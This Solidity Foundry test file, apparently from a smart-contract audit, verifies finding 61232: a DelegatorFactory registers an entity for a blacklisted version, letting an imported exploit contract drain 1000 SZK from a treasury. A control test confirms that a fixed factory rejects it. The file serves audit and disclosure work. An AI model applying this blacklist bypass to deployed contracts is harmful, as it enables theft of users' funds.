// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    DelegatorFactoryFixed,
    VaultEntity,
    Treasury,
    Token
} from "./61232-in-delegatorfactory-new-entity-can-be-created-for-a-blacklis.sol";

contract Finding61232Test is Test {
    function test_exploit_blacklisted_version_moves_N() public {
        Exploit e = new Exploit();
        e.run();

        assertTrue(e.factory().blacklisted(0), "version is blacklisted");
        assertTrue(e.factory().isEntity(e.entity()), "clone was registered");
        assertEq(e.token().balanceOf(address(e)), e.N(), "entity moved 1000 SZK");
        assertEq(e.token().balanceOf(address(e.treasury())), 0, "treasury was emptied");
    }

    function test_control_rejects_blacklisted_version() public {
        Token token = new Token("Suzaku", "SZK", 18);
        DelegatorFactoryFixed factory = new DelegatorFactoryFixed(address(this));
        VaultEntity impl = new VaultEntity(address(factory), 0);
        Treasury treasury = new Treasury(token, factory);
        token.mint(address(treasury), 1000 ether);
        factory.whitelist(address(impl));
        factory.blacklist(0);

        bytes memory data = abi.encode(address(treasury), address(this), uint256(1000 ether));
        (bool ok, bytes memory ret) =
            address(factory).call(abi.encodeWithSelector(factory.create.selector, uint64(0), data));

        assertFalse(ok, "control must reject the version");
        assertEq(bytes4(ret), DelegatorFactoryFixed.DelegatorFactory__VersionBlacklisted.selector);
        assertEq(factory.totalEntities(), 0, "no entity");
        assertEq(token.balanceOf(address(treasury)), 1000 ether, "N stays in the treasury");
        assertEq(token.balanceOf(address(this)), 0, "caller received nothing");
    }
}
